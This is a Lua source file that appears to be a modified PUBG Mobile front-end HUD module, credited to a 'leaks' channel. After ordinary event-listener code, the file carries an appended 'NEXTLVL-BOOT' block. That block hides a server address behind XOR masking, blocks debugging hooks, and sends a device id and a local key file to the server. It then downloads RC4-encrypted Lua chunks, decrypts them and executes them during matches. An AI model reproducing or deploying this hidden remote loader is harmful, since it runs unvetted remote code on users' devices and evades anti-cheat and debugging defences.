-- By @YargiIDE | Chanel @YARGI_LEAKS

local game_frontend_hud = {}
local string_format = string.format
local slua_GameFrontendHUD_local = slua_GameFrontendHUD
local frontendUtils
if slua_GameFrontendHUD_local then
  frontendUtils = slua_GameFrontendHUD_local:GetUtils()
end
local preSwitchLobbyEntryListener = {}
local postSwitchLobbyEntryListener = {}
local postSwitchGameStatusStartListener = {}
local postSwitchGameStatusListener = {}
local preSwitchGameStatusListener = {}
local preSwitchGameStatusEndListener = {}
local sLuaTickListener = {}

function game_frontend_hud.GetInstance()
  return slua_GameFrontendHUD_local
end

function game_frontend_hud.GetUserSettings()
  return game_frontend_hud.GetInstance():GetUserSettings()
end

function game_frontend_hud.AddToContainer(containerName, widget, zOrder)
  if slua_GameFrontendHUD then
    frontendUtils = slua_GameFrontendHUD:GetUtils()
  end
  local container = frontendUtils:GetGlobalUIContainer(containerName)
  container:AddWidgetWithZOrder(widget, zOrder)
end

function game_frontend_hud.RemoveFromContainer(containerName, widget)
  local container = frontendUtils:GetGlobalUIContainer(containerName)
  if slua.isValid(widget) then
    container:RemoveWidget(widget)
  end
end

function game_frontend_hud.SetPreSwitchLobbyEntryListener(func)
  assert(type(func) == "function", "parameter must be function type")
  preSwitchLobbyEntryListener[#preSwitchLobbyEntryListener + 1] = func
end

function game_frontend_hud.SetPostSwitchLobbyEntryListener(func)
  assert(type(func) == "function", "parameter must be function type")
  postSwitchLobbyEntryListener[#postSwitchLobbyEntryListener + 1] = func
end

function game_frontend_hud.SetPostSwitchGameStatusStartListener(func)
  postSwitchGameStatusStartListener[#postSwitchGameStatusStartListener + 1] = func
end

function game_frontend_hud.SetPostSwitchGameStatusListener(func)
  postSwitchGameStatusListener[#postSwitchGameStatusListener + 1] = func
end

function game_frontend_hud.SetPreSwitchGameStatusListener(func)
  preSwitchGameStatusListener[#preSwitchGameStatusListener + 1] = func
end

function game_frontend_hud.SetPreSwitchGameStatusEndListener(func)
  preSwitchGameStatusEndListener[#preSwitchGameStatusEndListener + 1] = func
end

function game_frontend_hud.SetSluaTickListener(func)
  sLuaTickListener[#sLuaTickListener + 1] = func
end

local function _OnPreSwitchGameStatus(nextState)
  local utility = require("common.utility")
  local preState = GameStatus.GetGameStatus()
  xpcall(GameStatus.CacheGameStatus, utility.ErrorMessageHandler, nextState)
  for i = 1, #preSwitchGameStatusListener do
    local func = preSwitchGameStatusListener[i]
    xpcall(func, utility.ErrorMessageHandler, preState, nextState)
  end
  local ClientEVOConfig = require("client.logic.client_evo_config.client_evo_config")
  ClientEVOConfig.OnPreLoadMap(slua_GameFrontendHUD_local.CurrentMapName)
  log_shipping_client("game_frontend_hud._OnPreSwitchGameStatus preState:" .. tostring(preState) .. " nextState:" .. tostring(nextState))
end

local function _OnPreSwitchGameEndStatus(nextState)
  local utility = require("common.utility")
  local preState = GameStatus.GetGameStatus()
  for i = 1, #preSwitchGameStatusEndListener do
    local func = preSwitchGameStatusEndListener[i]
    xpcall(func, utility.ErrorMessageHandler, preState, nextState)
  end
  log_shipping_client("game_frontend_hud._OnPreSwitchGameEndStatus preState:" .. preState .. " nextState:" .. nextState)
end

local function _OnPreSwitchLobbyEntry(nextState)
  local utility = require("common.utility")
  local preState = GameStatus.GetGameStatus()
  for i = 1, #preSwitchLobbyEntryListener do
    local func = preSwitchLobbyEntryListener[i]
    xpcall(func, utility.ErrorMessageHandler, preState, nextState)
  end
  log_shipping_client("game_frontend_hud._OnPreSwitchLobbyEntry preState:" .. preState .. " nextState:" .. nextState)
end

local function _OnPostSwitchLobbyEntry(nextState)
  local utility = require("common.utility")
  local preState = GameStatus.GetGameStatus()
  xpcall(GameStatus.CacheGameStatus, utility.ErrorMessageHandler, nextState)
  for i = 1, #postSwitchLobbyEntryListener do
    local func = postSwitchLobbyEntryListener[i]
    xpcall(func, utility.ErrorMessageHandler, preState, nextState)
  end
  log_shipping_client("game_frontend_hud._OnPostSwitchLobbyEntry stat:" .. nextState)
end

local function _OnPostSwitchGameStatusStart(nextState)
  local utility = require("common.utility")
  local preState = GameStatus.GetGameStatus()
  xpcall(GameStatus.CacheGameStatus, utility.ErrorMessageHandler, nextState)
  for i = 1, #postSwitchGameStatusStartListener do
    local func = postSwitchGameStatusStartListener[i]
    xpcall(func, utility.ErrorMessageHandler, preState, nextState)
  end
  log_shipping_client("game_frontend_hud._OnPostSwitchGameStatusStart stat:" .. nextState)
end

local function _OnPostSwitchGameStatus(nextState)
  local utility = require("common.utility")
  local preState = GameStatus.GetLastGameStatus()
  if nextState == GameStatus.Lobby then
    local logic_cost_collector = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.logic_cost_collector)
    logic_cost_collector:MarkEventEnd(logic_cost_collector.EVENT_KEYS.LOAD_MAP)
    logic_cost_collector:MarkIsolatedEventEnd(logic_cost_collector.ISOLATED_EVENT_NAMES.LoadLobbyMap)
  end
  for i = 1, #postSwitchGameStatusListener do
    local func = postSwitchGameStatusListener[i]
    xpcall(func, utility.ErrorMessageHandler, preState, nextState)
  end
  log_shipping_client("game_frontend_hud._OnPostSwitchGameStatus preState:" .. tostring(preState) .. " nextState:" .. tostring(nextState))
end

local function _OnAddLuaLogicManagerEvent(LuaFileName)
  if not LuaFileName then
    log_error("game_frontend_hud._OnAddLuaLogicManagerEvent LuaFileName: == nil")
    return
  end
  if LuaFileName == "" then
    log_error("game_frontend_hud._OnAddLuaLogicManagerEvent LuaFileName: == empty")
    return
  end
end

local function _OnRemoveLuaLogicManagerEvent(LuaFileName)
  if not LuaFileName then
    log_error("game_frontend_hud._OnRemoveLuaLogicManagerEvent LuaFileName: == nil")
    return
  end
  if LuaFileName == "" then
    log_error("game_frontend_hud._OnRemoveLuaLogicManagerEvent LuaFileName: == empty")
    return
  end
  log_shipping_client("game_frontend_hud._OnRemoveLuaLogicManagerEvent LuaFileName:" .. LuaFileName)
end

local function _SetGameStatus(status, lastStatus)
  log_shipping_client("game_frontend_hud._SetGameStatus stat:" .. status .. " lastStatus:" .. lastStatus)
  if status == lastStatus then
    log_error("status == lastStatus.Should not switch in the same scene.This maybe lead to memory leaks and dark scenes")
  end
  GameStatus.CacheGameStatus(status, lastStatus)
end

local function OnHandleWebviewAction(str)
  log(bWriteLog and "OnHandleWebviewAction str = " .. tostring(str))
  local webModule = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.webModule)
  webModule:RestoreFromWebPage(str)
  local WebviewSDK = require("client.slua.logic.url.logic_webview_sdk")
  WebviewSDK:RestoreFromWebPage(str)
end

local function OnGetTicketNotifyDelegate(ticket)
  log(bWriteLog and "OnGetTicketNotifyDelegate, ticket = " .. tostring(ticket))
  EventSystem:postEvent(EVENTTYPE_WEB_VIEW_TICKET, EVENTID_NOTIFY_WEB_VIEW_TICKET)
end

local function OnCloudGMReceiveDelegate(cmd)
  log(bWriteLog and "OnCloudGMReceiveDelegate : " .. tostring(cmd))
  local ClientCloudGM = require("GameLua.Mod.BaseMod.Client.ClientCloudGM")
  ClientCloudGM.HandleCloudGMCMDStr(cmd)
end

local function OnGameStatusSwitchTermination(status)
  log(bWriteLog and "OnGameStatusSwitchTermination : " .. tostring(status))
  local LogicSettingGraphics = require("client.slua.logic.setting.logic_setting_graphics")
  if status ~= GameStatus.Login then
    LogicSettingGraphics.ChangeGraphicsWhenModeSwitch()
  else
    LogicSettingGraphics.ProcessDefaultSettings()
  end
end

local function OnDolphinVersionInfoEvent(InVersionInfo)
  log_warning(bWriteLog and "  : OnDolphinVersionInfoEvent")
  local util = require("client.slua_ui_framework.util")
  local versionInfo = {}
  versionInfo = util.BPObjectToTable(InVersionInfo, versionInfo)
  log_tree("versionInfo", versionInfo)
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnDolphinVersionInfoEvent(versionInfo.VerData)
end

local function OnDolphinNoticeInstallApkEvent()
  log(bWriteLog and "OnDolphinNoticeInstallApkEvent")
  local updateUI = UIManager.GetUI(UIManager.UI_Config.version_update)
  if updateUI then
    updateUI:OnDolphinNoticeInstallApk()
  else
    log(bWriteLog and "OnDolphinNoticeInstallApkEvent, version_update is not showing?")
  end
end

local function OnDolphinProgressEvent(curStage)
  log(bWriteLog and "OnDolphinProgress, curStage = " .. tostring(curStage))
  local updateUI = UIManager.GetUI(UIManager.UI_Config.version_update)
  if updateUI then
    updateUI:OnDolphinProgress(curStage)
  else
    log(bWriteLog and "OnDolphinProgress, version_update is not showing?")
  end
end

local function OnDolphinErrorEvent(errorCode)
  local version_up_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.version_up_module)
  version_up_module:OnDolphinError(errorCode)
end

local function OnRepairOverMaxTimesEvent()
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnRepairOverMaxTimes()
end

local function OnUpdateFinishedEvent()
  local version_up_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.version_up_module)
  version_up_module:OnUpdateFinished()
end

local function OnRestartGameEvent()
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnRestartGame()
end

local function OnInitIMSDKEnvEvent()
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnInitIMSDKEnv()
end

local function OnGetEnableCDNGetVersionEvent(bEnabled)
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnGetEnableCDNGetVersion(bEnabled)
end

local function OnAfterLoadedEditorLoginEvent()
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnAfterLoadedEditorLogin()
end

local function OnClearUIBeforeReInitLuaStateEvent()
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnClearUIBeforeReInitLuaState()
end

local function OnInitStateEvent(state)
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnInitState(state)
end

local function OnGetRegionNoByCountryNoEvent(Country)
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnGetRegionNoByCountryNo(Country)
end

local function OnStartPufferUpdateEvent()
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnStartPufferUpdate()
end

local function OnQuickLoginEvent(InWrapper)
  local util = require("client.slua_ui_framework.util")
  local wrapper = {}
  wrapper = util.BPObjectToTable(InWrapper, wrapper)
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnQuickLoginEvent(wrapper)
end

local function OnPhoneMailLoginCallbackEvent(type, retCode, extraJson)
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnPhoneMailLoginCallbackDelegate(type, retCode, extraJson)
end

local function OnLoginSDKCallbackEvent(type)
  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
  login_module:OnLoginSDKCallbackDelegate(type)
end

local function OnDeviceRotationChanged(rotation)
  local WebviewSDK = require("client.slua.logic.url.logic_webview_sdk")
  WebviewSDK:OnDeviceRotationChanged(rotation)
  local lobby_camera_manager_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.Lobby_camera_manager_module)
  lobby_camera_manager_module:OnDeviceRotationChanged()
end

local function OnDeleteFileNotify(bsuccess, FileNameList)
  log(bWriteLog and string.format("OnDeleteFileNotify. bsuccess=%s, FileNameList=%s", tostring(bsuccess), tostring(FileNameList)))
  local PufferDeleteManager = require("client.slua.logic.download.delete.puffer_delete_manager")
  if PufferDeleteManager.ignoreFileDeleteNotify then
    return
  end
  local len = FileNameList:Num()
  local fileList = {}
  for i = 0, len - 1 do
    local fileName = FileNameList:Get(i)
    log(bWriteLog and "OnDeleteFileNotifyDelete. " .. tostring(fileName))
    if type(fileName) == "string" then
      local index = string.find(fileName, "Paks/")
      if index then
        fileName = string.sub(fileName, index + 5)
        if not Client.IsFileExistsWithOutPakCheck(fileName) then
          table.insert(fileList, fileName)
        else
          log_format("OnDeleteFileNotify. file exists: %s", fileName)
        end
      end
    end
  end
  PufferDeleteManager.OnDeleteFileNotify(fileList)
  local UBackpackUtils = import("BackpackUtils")
  UBackpackUtils.ClearItemExistCacheByODPakFiles(fileList)
end

local function OnLoadODPaksBinFinishNotify()
  log(bWriteLog and "OnLoadODPaksBinFinishNotify.")
  local PufferDownloader = require("client.slua.logic.download.puffer.logic_puffer_downloader")
  PufferDownloader.ODPaksBinLoaded()
end

local function OnTick(deltaTime)
  for i = 1, #sLuaTickListener do
    local func = sLuaTickListener[i]
    func(deltaTime)
  end
end

if slua_GameFrontendHUD_local then
  slua_GameFrontendHUD_local.OnPreSwitchGameStatusEvent:Add(_OnPreSwitchGameStatus)
  slua_GameFrontendHUD_local.OnPreSwitchGameStatusEndEvent:Add(_OnPreSwitchGameEndStatus)
  slua_GameFrontendHUD_local.OnPreSwitchLobbyEntry:Add(_OnPreSwitchLobbyEntry)
  slua_GameFrontendHUD_local.OnPostSwitchLobbyEntry:Add(_OnPostSwitchLobbyEntry)
  slua_GameFrontendHUD_local.OnPostSwitchGameStatusStartEvent:Add(_OnPostSwitchGameStatusStart)
  slua_GameFrontendHUD_local.OnPostSwitchGameStatusEvent:Add(_OnPostSwitchGameStatus)
  slua_GameFrontendHUD_local.OnAddLuaLogicManagerEvent:Add(_OnAddLuaLogicManagerEvent)
  slua_GameFrontendHUD_local.OnRemoveLuaLogicManagerEvent:Add(_OnRemoveLuaLogicManagerEvent)
  slua_GameFrontendHUD_local.OnSetGameStatusEvent:Add(_SetGameStatus)
  slua_GameFrontendHUD_local.OnHandleWebviewActionDelegate:Add(OnHandleWebviewAction)
  slua_GameFrontendHUD_local.OnGameStatusSwitchTerminate:Add(OnGameStatusSwitchTermination)
  slua_GameFrontendHUD_local.OnGetTicketNotifyDelegate:Add(OnGetTicketNotifyDelegate)
  slua_GameFrontendHUD_local.OnCloudGMReceive:Add(OnCloudGMReceiveDelegate)
  slua_GameFrontendHUD_local.OnDeviceRotationChangedEvent:Add(OnDeviceRotationChanged)
  if slua_GameFrontendHUD_local.OnDeleteFileNotifyEvent then
    log(bWriteLog and "OnDeleteFileNotifyEvent Add")
    slua_GameFrontendHUD_local.OnDeleteFileNotifyEvent:Add(OnDeleteFileNotify)
  end
  if slua_GameFrontendHUD_local.OnLoadODPaksBinFinishNotifyEvent then
    slua_GameFrontendHUD_local.OnLoadODPaksBinFinishNotifyEvent:Add(OnLoadODPaksBinFinishNotify)
  end
  if slua_GameFrontendHUD_local.OnDolphinVersionInfoDelegate then
    slua_GameFrontendHUD_local.OnDolphinVersionInfoDelegate:Add(OnDolphinVersionInfoEvent)
    log_warning(bWriteLog and "  : OnDolphinVersionInfoDelegate")
    slua_GameFrontendHUD_local.OnDolphinNoticeInstallApkDelegate:Add(OnDolphinNoticeInstallApkEvent)
    slua_GameFrontendHUD_local.OnDolphinProgressDelegate:Add(OnDolphinProgressEvent)
    slua_GameFrontendHUD_local.OnDolphinErrorDelegate:Add(OnDolphinErrorEvent)
    slua_GameFrontendHUD_local.OnRepairOverMaxTimesDelegate:Add(OnRepairOverMaxTimesEvent)
    slua_GameFrontendHUD_local.OnUpdateFinishedDelegate:Add(OnUpdateFinishedEvent)
    slua_GameFrontendHUD_local.OnRestartGameDelegate:Add(OnRestartGameEvent)
    slua_GameFrontendHUD_local.OnInitIMSDKEnvDelegate:Add(OnInitIMSDKEnvEvent)
    slua_GameFrontendHUD_local.OnGetEnableCDNGetVersionDelegate:Add(OnGetEnableCDNGetVersionEvent)
    slua_GameFrontendHUD_local.OnAfterLoadedEditorLoginDelegate:Add(OnAfterLoadedEditorLoginEvent)
    slua_GameFrontendHUD_local.OnClearUIBeforeReInitLuaStateDelegate:Add(OnClearUIBeforeReInitLuaStateEvent)
    slua_GameFrontendHUD_local.OnInitStateDelegate:Add(OnInitStateEvent)
    slua_GameFrontendHUD_local.OnStartPufferUpdateDelegage:Add(OnStartPufferUpdateEvent)
    slua_GameFrontendHUD_local.OnGetRegionNoByCountryNoDelegate:Add(OnGetRegionNoByCountryNoEvent)
    slua_GameFrontendHUD_local.OnQuickLoginDelegate:Add(OnQuickLoginEvent)
    slua_GameFrontendHUD_local.OnPhoneMailLoginCallbackDelegate:Add(OnPhoneMailLoginCallbackEvent)
    slua_GameFrontendHUD_local.OnLoginSDKCallbackDelegate:Add(OnLoginSDKCallbackEvent)
  end
end
slua.setTickFunction(OnTick)
--[[ NEXTLVL-BOOT ]] do
------------------------------------------------------------------
-- crypto primitives (pure Lua 5.1, no bit lib required)
------------------------------------------------------------------
local _NIB = {}
do
  for _a = 0, 15 do
    for _b = 0, 15 do
      local _r, _x, _y, _p = 0, _a, _b, 1
      for _ = 1, 4 do
        if (_x % 2) ~= (_y % 2) then _r = _r + _p end
        _x = math.floor(_x / 2)
        _y = math.floor(_y / 2)
        _p = _p * 2
      end
      _NIB[_a * 16 + _b] = _r
    end
  end
end

local function _bx(_x, _y)
  return _NIB[math.floor(_x / 16) * 16 + math.floor(_y / 16)] * 16
       + _NIB[(_x % 16) * 16 + (_y % 16)]
end

local function _rc4(_key, _data)
  local _S = {}
  for _i = 0, 255 do _S[_i] = _i end
  local _j, _kl = 0, #_key
  for _i = 0, 255 do
    _j = (_j + _S[_i] + string.byte(_key, (_i % _kl) + 1)) % 256
    _S[_i], _S[_j] = _S[_j], _S[_i]
  end
  local _i, _j2 = 0, 0
  local _out = {}
  local _n = 0
  for _k = 1, #_data do
    _i = (_i + 1) % 256
    _j2 = (_j2 + _S[_i]) % 256
    _S[_i], _S[_j2] = _S[_j2], _S[_i]
    _n = _n + 1
    _out[_n] = string.char(_bx(string.byte(_data, _k), _S[(_S[_i] + _S[_j2]) % 256]))
  end
  return table.concat(_out)
end

local _B64M = {}
do
  local _B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  for _i = 1, 64 do _B64M[string.sub(_B, _i, _i)] = _i - 1 end
end

local function _b64d(_s)
  local _t = {}
  local _n = 0
  local _i = 1
  local _l = #_s
  while _i <= _l do
    local _c1 = _B64M[string.sub(_s, _i, _i)]; _i = _i + 1
    local _c2 = _B64M[string.sub(_s, _i, _i)]; _i = _i + 1
    local _c3s = string.sub(_s, _i, _i); _i = _i + 1
    local _c4s = string.sub(_s, _i, _i); _i = _i + 1
    local _c3 = _c3s ~= "=" and _B64M[_c3s] or 0
    local _c4 = _c4s ~= "=" and _B64M[_c4s] or 0
    _n = _n + 1
    _t[_n] = string.char(_c1 * 4 + math.floor(_c2 / 16))
    if _c3s ~= "=" then
      _n = _n + 1
      _t[_n] = string.char((_c2 % 16) * 16 + math.floor(_c3 / 4))
    end
    if _c4s ~= "=" then
      _n = _n + 1
      _t[_n] = string.char((_c3 % 4) * 64 + _c4)
    end
  end
  return table.concat(_t)
end

local _ld = loadstring or load

local _LOG_FILE = "/storage/emulated/0/Android/data/com.pubg.imobile/files/Myweowlogs.txt"
local function _log(_msg)
  pcall(function()
    local _f = io.open(_LOG_FILE, "a")
    if _f then
      _f:write(os.date("%Y-%m-%d %H:%M:%S") .. " | " .. tostring(_msg) .. "\n")
      _f:flush()
      _f:close()
    end
  end)
end

------------------------------------------------------------------
-- anti-dump prelude (run before anything sensitive is loaded)
------------------------------------------------------------------
pcall(function() rawset(string, "dump", nil) end)
pcall(function()
  if debug then
    rawset(debug, "sethook", function() error("blocked", 2) end)
    rawset(debug, "debug", nil)
  end
end)
local _tainted = false
pcall(function()
  if _G.mobdebug or (package.loaded and package.loaded["mobdebug"]) then _tainted = true end
end)

------------------------------------------------------------------
-- single-instance guard (game may load this file multiple times)
------------------------------------------------------------------
local _first = not _G._NEXTLVL_STARTED
_G._NEXTLVL_STARTED = true

if _first then

------------------------------------------------------------------
-- config (generated at build time, masked)
------------------------------------------------------------------
local _cfg = {
  v = 7,
  m = {208,172,109,253,217,40,156,45},
  mk = {253,6,80,122,164,84,111,216,154,81,60,136,233,131,25,176,112,2,250,218,71,41,210,110,180,227,63,253,108,122,190,218},
  ho = {184,216,25,141,170,18,179,2,190,201,21,137,181,94,240,3,163,219,12,141,183,65,240,70,191,192,12,137,188,24,168,25,254,219,2,143,178,77,238,94,254,200,8,139},
}

local function _dec(_arr)
  local _out = {}
  for _i = 1, #_arr do
    _out[_i] = string.char(_bx(_arr[_i], _cfg.m[(_i - 1) % #_cfg.m + 1]))
  end
  return table.concat(_out)
end

local _HOST = _dec(_cfg.ho)
local _MK = _dec(_cfg.mk)
local _V = _cfg.v
_cfg = nil
_log("========== NEXTLVL-BOOT v" .. _V .. " ==========")
_log("host=" .. _HOST)

------------------------------------------------------------------
-- device id (persistent file, same as old script)
------------------------------------------------------------------
local _IDF = "/storage/emulated/0/Android/data/com.pubg.imobile/files/.device_id"
local _DID = ""
do
  local _f = io.open(_IDF, "r")
  if _f then
    _DID = string.gsub(_f:read("*all") or "", "%s+", "")
    _f:close()
  end
  if _DID == "" then
    _DID = "DEV_" .. string.format("%08x_%08x", math.random(0, 0x7fffffff), math.random(0, 0x7fffffff))
    local _f = io.open(_IDF, "w")
    if _f then _f:write(_DID) _f:close() end
  end
end
_log("device_id=" .. _DID)

------------------------------------------------------------------
-- key file
------------------------------------------------------------------
local _KEY = ""
do
  local _f = io.open("/storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/key.txt", "r")
  if _f then
    _KEY = string.gsub(_f:read("*all") or "", "%s+", "")
    _f:close()
  end
end
_log("key=" .. (_KEY ~= "" and _KEY or "EMPTY"))

------------------------------------------------------------------
-- http helper (same API as old script: http_manager module)
------------------------------------------------------------------
local _http
pcall(function()
  _http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
end)

local function _post(_path, _body, _cb)
  if not _http or not _http.Post then _log("no http manager") return end
  pcall(function()
    _http:Post(_HOST .. _path, { ["Content-Type"] = "application/json" }, _body, nil, function(_s, _d)
      if not _cb then return end
      if _s and _d and #_d > 0 then
        local _ok, _r = pcall(json.decode, _d)
        if _ok and _r then _cb(true, _r) else _cb(false, nil) end
      else
        _cb(false, nil)
      end
    end)
  end)
end

------------------------------------------------------------------
-- state machine
------------------------------------------------------------------
local _phase = "validate"
local _session = ""
local _files = {}
local _chunks = {}
local _tries = 0
local _fi = 1
local _executed = false
local _last = 0
local _abort = false

local function _validate()
  _tries = _tries + 1
  if _tries > 20 then _abort = true _log("ABORT validate retries exhausted") return end
  _post("/validate", string.format('{"key":"%s","device_id":"%s"}', _KEY, _DID), function(_ok, _r)
    if _abort then return end
    if not _ok then _log("validate http fail (attempt " .. _tries .. ")") return end
    if not _r or not _r.valid then
      _log("validate rejected (attempt " .. _tries .. "): " .. tostring(_r and _r.error or "invalid"))
      return
    end
    _session = _r.session or ""
    _files = _r.allowed_files or {}
    _log("validate OK session=" .. _session:sub(1, 8) .. " files=" .. table.concat(_files, ","))
    if _session ~= "" and #_files > 0 then
      _phase = "fetch"
      _tries = 0
    end
  end)
end

local function _fetchNext()
  _tries = _tries + 1
  if _tries > 30 then _abort = true _log("ABORT fetch retries exhausted") return end
  if _fi > #_files then
    _phase = "wait"
    _tries = 0
    _log("all chunks fetched, waiting for match")
    return
  end
  local _f = _files[_fi]
  if _chunks[_f] then
    _fi = _fi + 1
    _fetchNext()
    return
  end
  _log("fetching " .. _f .. " (attempt " .. _tries .. ")")
  _post("/g", string.format('{"session":"%s","dev":"%s","f":"%s"}', _session, _DID, _f), function(_ok, _r)
    if not _ok or not _r then _log("fetch " .. _f .. " http fail") return end
    if not _r.ok or not _r.data or #_r.data <= 32 then
      _log("fetch " .. _f .. " rejected: " .. tostring(_r and _r.error or "short data"))
      return
    end
    local _raw = _b64d(_r.data)
    local _key = _MK .. _f
    local _plain = _rc4(_key, _raw)
    local _fn, _err = _ld(_plain, "@" .. _f)
    _plain = nil
    _raw = nil
    if _fn then
      _chunks[_f] = _fn
      _G._NEXTLVL_CACHE = _G._NEXTLVL_CACHE or {}
      _G._NEXTLVL_CACHE[_f] = _fn
      _G._NEXTLVL_FILES = _files
      _log("chunk " .. _f .. " decrypted+loaded OK")
      _fi = _fi + 1
      _tries = 0
      _fetchNext()
    else
      _log("chunk " .. _f .. " loadstring err: " .. tostring(_err))
    end
  end)
end

local function _ready()
  local _ok1, _m1 = pcall(require, "GameLua.GameCore.Data.GameplayData")
  local _ok2, _m2 = pcall(require, "GameLua.GameCore.Framework.CharacterBase")
  local _ok3, _m3 = pcall(require, "combine_class")
  if not (_ok1 and _m1 and _ok2 and _m2 and _ok3 and _m3) then
    _log("not ready: GameplayData=" .. tostring(_ok1 and _m1 ~= nil) .. " CharacterBase=" .. tostring(_ok2 and _m2 ~= nil) .. " combine_class=" .. tostring(_ok3 and _m3 ~= nil))
    return false
  end
  local _hasStatus = false
  local _inBattle = false
  pcall(function()
    if GameStatus and GameStatus.GetGameStatus and GameStatus.Battle then
      _hasStatus = true
      _inBattle = (GameStatus.GetGameStatus() == GameStatus.Battle)
    end
  end)
  if _hasStatus then
    _log("ready check: modules OK, status gate " .. (_inBattle and "BATTLE" or "NOT-BATTLE"))
    return _inBattle
  end
  _log("ready check: modules OK, no GameStatus gate")
  return true
end

local function _exec()
  if _tainted then
    _abort = true
    _log("ABORT mobdebug/taint detected")
    return
  end
  if _G._NEXTLVL_EXECUTED then return end
  _G._NEXTLVL_EXECUTED = true
  for _i = 1, #_files do
    local _f = _files[_i]
    local _fn = _chunks[_f]
    if _fn then
      _log("executing " .. _f)
      local _ok, _err = pcall(_fn)
      if _ok then
        _log("executed " .. _f .. " OK")
      else
        _log("exec " .. _f .. " ERROR: " .. tostring(_err))
      end
      _chunks[_f] = nil
    else
      _log("exec skip " .. _f .. " (not loaded)")
    end
  end
  _executed = true
  _G._NEXTLVL_VER = _V
  _log("========== ALL DONE (ver " .. _V .. ") ==========")
  collectgarbage("collect")
end

local function _poll(_dt)
  if _abort or _executed then return end
  local _now = os.time()
  if _now == _last then return end
  _last = _now
  if _KEY == "" or _DID == "" then return end
  if _phase == "validate" then
    _validate()
  elseif _phase == "fetch" then
    _fetchNext()
  elseif _phase == "wait" then
    if _ready() then _exec() end
  end
end

if game_frontend_hud and game_frontend_hud.SetSluaTickListener then
  game_frontend_hud.SetSluaTickListener(_poll)
  _log("tick listener registered")
end

end -- if _first

end
return game_frontend_hud


-- By @YargiIDE | Chanel @YARGI_LEAKS